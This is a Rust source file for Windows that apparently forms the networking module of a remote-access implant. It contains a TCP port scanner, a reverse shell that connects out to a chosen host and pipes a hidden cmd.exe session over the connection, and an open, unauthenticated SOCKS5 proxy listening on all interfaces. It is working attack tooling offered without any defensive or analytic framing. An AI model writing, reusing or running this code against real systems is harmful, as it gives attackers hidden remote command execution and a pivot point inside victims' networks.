// language: Rust, file: src/net.rs, target: Windows
// Network tooling: TCP port scan, interactive reverse shell, and a SOCKS5 proxy.
#![allow(dead_code)]
use anyhow::Result;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

/// Parse "22,80,443" or "1-1024" into a port list.
fn parse_ports(spec: &str) -> Vec<u16> {
    let mut ports = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if let Some((a, b)) = part.split_once('-') {
            if let (Ok(a), Ok(b)) = (a.trim().parse::<u16>(), b.trim().parse::<u16>()) {
                for p in a..=b {
                    ports.push(p);
                }
            }
        } else if let Ok(p) = part.parse::<u16>() {
            ports.push(p);
        }
    }
    ports.sort_unstable();
    ports.dedup();
    ports
}

/// TCP connect scan of host:ports. Returns (open_ports, scan_list).
pub async fn portscan(host: &str, spec: &str) -> Result<(Vec<u16>, Vec<u16>)> {
    let ports = parse_ports(spec);
    let mut open = Vec::new();
    for p in &ports {
        let addr = format!("{host}:{p}");
        if tokio::time::timeout(Duration::from_millis(700), TcpStream::connect(&addr))
            .await
            .ok()
            .and_then(|r| r.ok())
            .is_some()
        {
            open.push(*p);
        }
    }
    Ok((open, ports))
}

/// Connect back to `host:port` and pipe a cmd.exe shell over it. Blocks forever.
pub async fn reverse_shell(host: &str, port: u16) -> Result<()> {
    use std::process::Stdio;
    let stream = TcpStream::connect(format!("{host}:{port}")).await?;
    let (mut rd, mut wr) = stream.into_split();

    let mut child = tokio::process::Command::new("cmd.exe")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .creation_flags(0x0800_0000)
        .spawn()?;

    let mut child_in = child.stdin.take().unwrap();
    let mut child_out = child.stdout.take().unwrap();
    let mut child_err = child.stderr.take().unwrap();

    let t1 = tokio::spawn(async move {
        let mut buf = [0u8; 4096];
        loop {
            match rd.read(&mut buf).await {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if child_in.write_all(&buf[..n]).await.is_err() {
                        break;
                    }
                }
            }
        }
    });
    let t2 = tokio::spawn(async move {
        let mut buf = [0u8; 4096];
        loop {
            match child_out.read(&mut buf).await {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if wr.write_all(&buf[..n]).await.is_err() {
                        break;
                    }
                }
            }
        }
    });
    let t3 = tokio::spawn(async move {
        let mut buf = [0u8; 4096];
        while let Ok(n) = child_err.read(&mut buf).await {
            if n == 0 {
                break;
            }
        }
    });
    let _ = tokio::join!(t1, t2, t3);
    let _ = child.kill().await;
    Ok(())
}

/// Minimal SOCKS5 server on 0.0.0.0:port (CONNECT only, no auth).
pub async fn socks5_proxy(port: u16) -> Result<()> {
    let listener = TcpListener::bind(("0.0.0.0", port)).await?;
    loop {
        let (client, _) = match listener.accept().await {
            Ok(c) => c,
            Err(_) => continue,
        };
        tokio::spawn(async move {
            let _ = handle_socks5(client).await;
        });
    }
}

async fn handle_socks5(mut client: TcpStream) -> Result<()> {
    let mut head = [0u8; 2];
    client.read_exact(&mut head).await?;
    let n = head[1] as usize;
    let mut methods = vec![0u8; n];
    client.read_exact(&mut methods).await?;
    client.write_all(&[0x05, 0x00]).await?;

    let mut req = [0u8; 4];
    client.read_exact(&mut req).await?;
    let (atyp, cmd) = (req[3], req[1]);
    if cmd != 0x01 {
        client.write_all(&[0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0]).await?;
        return Ok(());
    }
    let target = match atyp {
        0x01 => {
            let mut a = [0u8; 4];
            client.read_exact(&mut a).await?;
            std::net::Ipv4Addr::from(a).to_string()
        }
        0x03 => {
            let mut l = [0u8; 1];
            client.read_exact(&mut l).await?;
            let mut d = vec![0u8; l[0] as usize];
            client.read_exact(&mut d).await?;
            String::from_utf8_lossy(&d).to_string()
        }
        0x04 => {
            let mut a = [0u8; 16];
            client.read_exact(&mut a).await?;
            std::net::Ipv6Addr::from(a).to_string()
        }
        _ => return Ok(()),
    };
    let mut pb = [0u8; 2];
    client.read_exact(&mut pb).await?;
    let port = u16::from_be_bytes(pb);

    match TcpStream::connect(format!("{target}:{port}")).await {
        Ok(mut upstream) => {
            client.write_all(&[0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0]).await?;
            let _ = tokio::io::copy_bidirectional(&mut client, &mut upstream).await;
        }
        Err(_) => {
            client.write_all(&[0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0]).await?;
        }
    }
    Ok(())
}
